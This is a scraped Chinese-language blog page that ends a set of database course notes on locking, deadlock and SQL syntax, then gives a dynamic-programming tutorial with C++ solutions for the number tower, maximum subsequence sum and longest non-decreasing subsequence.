<p>T1封锁了R，T2请求封锁R等待，T3请求封锁R，首先批准T3，则T2一直被插队。</p>
<p><strong>死锁：</strong></p>
<p>T1封锁R1，T2封锁R2，他们相互请求封锁对方的数据。</p>
<ul>
<li>预防死锁：一次封锁全部数据，按照数据对象给定的顺序封锁</li>
<li>诊断解除死锁：超时则判定死锁，（周期性生成）事务等待图（有回路则死锁）。选择处理代价最小的事务撤销，释放其所有的锁。</li>
</ul>
<h3 id="数据库编程"><a href="#数据库编程" class="headerlink" title="数据库编程"></a>数据库编程</h3><p><strong>SQLCA：</strong>（数据结构）</p>
<p>sql语句执行后系统反馈给程序当前的工作状态、运行环境</p>
<p><strong>主变量：</strong></p>
<p>sql语句中使用的主语言的程序变量</p>
<p><strong>游标：</strong></p>
<p>数据缓冲区，存放SQL语句执行结果</p>
<p><strong>建立和关闭数据库连接</strong></p>
<p><strong>存储过程：</strong></p>
<p>经编译后存储在数据库服务器中，使用只需要调用。持久性存储模块。</p>
<ul>
<li><p>CREATE PROCEDURE P1(a int, b float) </p>
<p>AS DECLARE c int;</p>
<p>BEGIN </p>
<p>select grade into a from sc;</p>
<p>IF THEN ENDIF; </p>
<p>END;</p>
</li>
<li><p>CALL PROCEDURE P1(a,b);</p>
</li>
<li><p>ALTER PROCEDURE P1 RENAME TO P2;</p>
</li>
<li><p>DROP PROCEDURE P1;</p>
</li>
</ul>
<p><strong>函数：</strong></p>
<p>函数必须指定返回的类型</p>
<ul>
<li>CREATE FUNCTION F1(a INT) RETURN char(9) AS…;</li>
<li>SELECT F1(a);</li>
</ul>
<h3 id="SQL特点"><a href="#SQL特点" class="headerlink" title="SQL特点"></a>SQL特点</h3><ul>
<li>综合统一——集DDL,DML,DCL功能于一体，可以独立完成数据库生命周期中的全部活动，可随时修改模式，数据操作符统一</li>
<li>高度非过程化——无需了解存储路径</li>
<li>面向集合的操作方式</li>
<li>以同一种语法结构提供多种使用方式——独立语言，也可以嵌入式</li>
<li>语言简洁、易学易用</li>
</ul>
<p><strong>数据定义：</strong></p>
<ul>
<li>CREATE SCHEMA S1 AUTHORIZATION zhang;</li>
<li>DROP SCHEMA S1 CASCADE/RESTRICT;</li>
<li>CREATE TABLE T1(Sno char(9) PRIMARY KEY, Sname char(20) UNIQUE);//UNIQUE不能取空</li>
<li>ALTER TABLE T1 [ADD COLUMN Snoo char(9) NOT NULL] [ADD CONSTRAINT XXX] [DROP COLUMN/CONSTRAINT XXX [CASCADE|RESTRICT] ] [ALTER COLUMN Sno char(10)];</li>
<li>DROP TABLE T1 [CASCADE| RESTRICT];//cascade会删除视图、触发器、索引等</li>
<li>CREATE [UNIQUE] [CLUSTER] INDEX I1 ON SC(Sno DESC);//默认ASC</li>
<li>ALTER INDEX I1 RENAME TO I2;</li>
<li>DROP INDEX I1;</li>
</ul>
<p><strong>数据查询：</strong></p>
<p>SELECT [ALL|DISTINCT] Sno FROM SC [AS XX] [WHERE xxx] [GROUP BY xxx HAVING XXX] [ORDER BY Sno [ASC|DESC] ];</p>
<p>GROUP BY:如果没有对查询结果分组，聚集函数将作用于整个查询结果，分组后聚集函数作用于每个组。</p>
<p>WHERE中不能有聚集函数，用HAVING替代，HAVING作用于组。</p>
<p>外连接：SELECT XX FROM Student LEFT OUT JOIN sc ON (Studnt.Sno = sc.Sno);</p>
<p>嵌套查询：子查询不能order by</p>
<p>集合查询：UNION（自动去掉重复元组，加ALL保留） INTERSECT EXCEPT，两个结果必须相容</p>
<p>基于派生表的查询：</p>
<p>SELECT Sno,Cno FROM SC,(SELECT Sno,avg(grade) FROM sc GROUP BY Sno) as avg_sc(avg_Sno,avg_grade) WHERE xxx;</p>
<p><strong>数据插入：</strong></p>
<ul>
<li>INSERT INTO sc [(Sno,cno)] VALUES (‘XXX’,’XX’);</li>
<li>INSERT INTO sc [(xx)] (SELECT XXX);//必须与INTO匹配</li>
</ul>
<p><strong>数据修改删除：</strong></p>
<ul>
<li>UPDATE SC SET sno=’1’, cno = ‘2’ [WHERE XXX];</li>
<li>DELETE FROM SC [WHERE XXX];</li>
</ul>
<p><strong>视图：</strong></p>
<ul>
<li>CREATE VIEW V1 [(Sno, Cno)] AS (SELECT XXX) [WITH CHECK OPTION];//对视图更新操作满足视图定义的条件</li>
<li>DROP VIEW V1[CASCADE];</li>
<li>查询视图：视图消解法</li>
<li>更新视图：回更新基本表，但有些视图是不能更新的，因为不能唯一有意义的转换为对基本表的更新。不允许更新的视图定义上的视图也不允许更新。</li>
<li>作用：简化用户操作，使用户以多种角度看待同一数据，提供逻辑独立性，安全保护，更清晰表达查询。</li>
</ul>
<p>L14p79检查点</p>
<p>L15p69可串行性</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://imane219.github.io/project/2020/10/27/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/project/images/avatar.gif">
      <meta itemprop="name" content="Imane">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Imane's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/project/2020/10/27/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/" class="post-title-link" itemprop="url">动态规划</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-10-27 23:58:00" itemprop="dateCreated datePublished" datetime="2020-10-27T23:58:00+08:00">2020-10-27</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2021-05-17 15:59:53" itemprop="dateModified" datetime="2021-05-17T15:59:53+08:00">2021-05-17</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/project/categories/%E7%AE%97%E6%B3%95/" itemprop="url" rel="index"><span itemprop="name">算法</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="一维动态规划"><a href="#一维动态规划" class="headerlink" title="一维动态规划"></a>一维动态规划</h3><hr>
<p><strong>重叠子问题（Overlapping Subproblems）：</strong>一个问题可以被分解为若干个子问题，且这些子问题会重复出现。</p>
<p><strong>最优子结构（Optimal Substructure）：</strong>一个问题的最优解可以由其子问题有效的构造出来。</p>
<blockquote>
<p>一个问题必须有这两个特点，才能用动态规划去解决。动态规划通过记录重叠子问题的解（递推或者记忆化搜索）来解决问题。</p>
</blockquote>
<h4 id="1-数塔问题（二维）"><a href="#1-数塔问题（二维）" class="headerlink" title="1.数塔问题（二维）"></a>1.数塔问题（二维）</h4><p><img src="/project/2020/10/27/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/number_tower.png" alt="number_tower"></p>
<p><strong>解法：</strong>用 $f[i][j]$ 存数塔中的数，$dp[i][j]$表示数塔（i，j）处数之前可取的最大路径值，可写出状态转移方程：$dp[i][j] = max(dp[i+1][j], dp[i+1][j+1]) + f[i][j]$</p>
<p><strong>代码：</strong></p>
<p>递归写法（含有许多重复计算）</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1001</span>;</span><br><span class="line"><span class="keyword">int</span> f[maxn][maxn];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">max_path</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> j, <span class="keyword">int</span> n)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= i; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;f[i][j]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="built_in">max_path</span>(<span class="number">1</span>, <span class="number">1</span>, n));</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">max_path</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> j, <span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (i == n)</span><br><span class="line">		<span class="keyword">return</span> f[i][j];</span><br><span class="line">	<span class="keyword">int</span> left, right;</span><br><span class="line">	left = <span class="built_in">max_path</span>(i + <span class="number">1</span>, j, n);</span><br><span class="line">	right = <span class="built_in">max_path</span>(i + <span class="number">1</span>, j + <span class="number">1</span>, n);</span><br><span class="line">	<span class="keyword">return</span> (left &gt; right) ? (left + f[i][j]) : (right + f[i][j]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>递归写法（记忆化搜索）</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1001</span>;</span><br><span class="line"><span class="keyword">int</span> f[maxn][maxn], dp[maxn][maxn];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">max_path</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> j, <span class="keyword">int</span> n)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= i; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;f[i][j]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="built_in">max_path</span>(<span class="number">1</span>, <span class="number">1</span>, n));</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">max_path</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> j, <span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (i == n)<span class="comment">//边界条件</span></span><br><span class="line">		dp[i][j] = f[i][j];</span><br><span class="line">	<span class="keyword">if</span> (dp[i][j] != <span class="number">0</span>)<span class="comment">//数塔从1开始 &amp;&amp; (i,j)之前的最长路径已经被记录</span></span><br><span class="line">		<span class="keyword">return</span> dp[i][j];</span><br><span class="line">	<span class="comment">//(i,j)之前的最长路径未被记录</span></span><br><span class="line">	dp[i+<span class="number">1</span>][j] = <span class="built_in">max_path</span>(i + <span class="number">1</span>, j, n);</span><br><span class="line">	dp[i+<span class="number">1</span>][j+<span class="number">1</span>] = <span class="built_in">max_path</span>(i + <span class="number">1</span>, j + <span class="number">1</span>, n);</span><br><span class="line">	<span class="keyword">return</span> (dp[i + <span class="number">1</span>][j] &gt; dp[i + <span class="number">1</span>][j + <span class="number">1</span>]) ? (dp[i + <span class="number">1</span>][j] + f[i][j]) : (dp[i + <span class="number">1</span>][j + <span class="number">1</span>] + f[i][j]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>递推写法</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1001</span>;</span><br><span class="line"><span class="keyword">int</span> f[maxn][maxn], dp[maxn][maxn];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">max_path</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> j, <span class="keyword">int</span> n)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)<span class="comment">//输入</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= i; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;f[i][j]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)<span class="comment">//边界</span></span><br><span class="line">		dp[n][i] = f[n][i];</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = n - <span class="number">1</span>; i &gt; <span class="number">0</span>; i--)<span class="comment">//求出每个dp[i][j]</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= i; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			dp[i][j] = <span class="built_in">max</span>(dp[i + <span class="number">1</span>][j], dp[i + <span class="number">1</span>][j + <span class="number">1</span>]) + f[i][j];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, dp[<span class="number">1</span>][<span class="number">1</span>]);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-最大连续子序列和"><a href="#2-最大连续子序列和" class="headerlink" title="2. 最大连续子序列和"></a>2. 最大连续子序列和</h4><p><img src="/project/2020/10/27/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/%E6%9C%80%E5%A4%A7%E8%BF%9E%E7%BB%AD%E5%AD%90%E5%BA%8F%E5%88%97.png" alt="最大连续子序列"></p>
<p><strong>解法：</strong>令dp[i]表示以A[i]结尾的最大连续序列和，那么整个序列的最大和即为dp[1]—dp[n]中最大值.接下来可以求得dp[i]状态转移方程$dp[i] = max(A[i],A[i]+dp[i-1] )$。边界条件即dp[0] = A[0].</p>
<p>对于上例13来说，以它为结尾的最大序列和要么是13+以-4结尾的最大序列和，要么是13本身（加上-4部分反而会更小）。</p>
<p><strong>代码：</strong></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1000</span>;</span><br><span class="line"><span class="keyword">int</span> A[maxn], dp[maxn];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;A[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	dp[<span class="number">1</span>] = A[<span class="number">1</span>];<span class="comment">//边界</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= n; i++)</span><br><span class="line">		dp[i] = <span class="built_in">max</span>(A[i], A[i] + dp[i - <span class="number">1</span>]);</span><br><span class="line">	<span class="keyword">int</span> max = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">		<span class="keyword">if</span> (dp[i] &gt; max)</span><br><span class="line">			max = dp[i];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, max);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="3-最长不降子序列-LIS"><a href="#3-最长不降子序列-LIS" class="headerlink" title="3. 最长不降子序列(LIS)"></a>3. 最长不降子序列(LIS)</h4><p><img src="/project/2020/10/27/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/LIS.jpg" alt="LIS"></p>
<p><strong>解法一:</strong></p>
<p>dp[i]记录以A[i]结尾的LIS长度，则整个序列的LIS长度为dp[1]—dp[n]中最大值。其中dp[i]的取值要么为dp[j]+1(此时A[i]可以接在以A[j]结尾的LIS之后)，要么为1（此时A[i]值非常小，没有办法接在任何子链后面）。由此可写出状态转移方程：$dp[i] = max(1,dp[j]+1) (j = 1,2,…,i-1 且 A[j] &lt;= A[i])$.其中dp[j]+1中的j表示满足A[j] &lt;= A[i]的j.当A[i]是当前最小值时，dp[j]+1并不存在，此时dp[i]为1.此解法复杂度为$O(n^2)$.</p>
<p><strong>代码：</strong></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1000</span>;</span><br><span class="line"><span class="keyword">int</span> A[maxn], dp[maxn];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;A[i]);</span><br><span class="line">	<span class="keyword">int</span> ans = <span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		dp[i] = <span class="number">1</span>;<span class="comment">//先假定每个元素自成一个子序列</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; i; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (A[j] &lt;= A[i] &amp;&amp; dp[j] + <span class="number">1</span> &gt; dp[i])</span><br><span class="line">			&#123;</span><br><span class="line">				dp[i] = dp[j] + <span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		ans = <span class="built_in">max</span>(dp[i], ans);<span class="comment">//在生成过程中记录最大dp[i]</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, ans);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>解法二:</strong> </p>
<p>在解法一中，每次计算dp[i]都要将所有A[i]前面的A[j]同A[i]比较一遍，也因此占用了n的复杂度，解法二是对比较过程的优化。</p>
<p>设置一个数组d，其中d[i]表示长度为i的LIS最小尾元素的值，len表示d数组中元素个数。如下图所示，len的长度就是我们需要的最终结果（即6），在维护d[len]的过程中，首先遍历序列，若遇到比当前len所存的d[len]值更大的数，则放在d[++len]处（如9后面的16）；若遇到比当前len所存的d[len]小的数，则去替换前面第一个比自己大的数（如18原来在37的后面，在d数组中替换了前面的24）。</p>
<p>需要注意的是，d[len]所存结果并不是最终的LIS序列，但其len值是最大的LIS长度，并且每一个d[len]的值（如37）都一定是可达的（即有以它为结尾的LIS），只不过可达的路径中有的值可能被替换掉了。</p>
<p><img src="/project/2020/10/27/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/LIS%E4%BC%98%E5%8C%96.jpg" alt="LIS优化"></p>
<p>在此解法中，遍历耗时n，查找替换值可采用二分查找法，耗时logn，总的复杂度为<strong>O(nlogn)</strong>.</p>
<p><strong>代码：</strong></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1000</span>;</span><br><span class="line"><span class="keyword">int</span> A[maxn], dp[maxn],d[maxn];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n, len = <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)<span class="comment">//存入A[i]，从1开始</span></span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;A[i]);</span><br><span class="line">	d[++len] = A[<span class="number">1</span>];<span class="comment">//初始化</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= n; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (A[i] &gt;= d[len])</span><br><span class="line">			d[++len] = A[i];</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">int</span> *j = <span class="built_in">upper_bound</span>(d + <span class="number">1</span>, d + len + <span class="number">1</span>, A[i]);</span><br><span class="line">			*j = A[i];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, len);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>upper_bound(first,last,val)：STL algorithm中的函数，用于在一个<strong>升序</strong>数组/容器中。在[first,last)中找到第一个值大于val的元素并返回其指针，first、last也是位置指针。同理还有lower_bound，它找的是第一个值大于等于val的元素，他们都采用二分查找，复杂度为O(logn)。</p>
<p>如果是降序容器，需要用greater<int>()重载upper_bound。</p>
</blockquote>
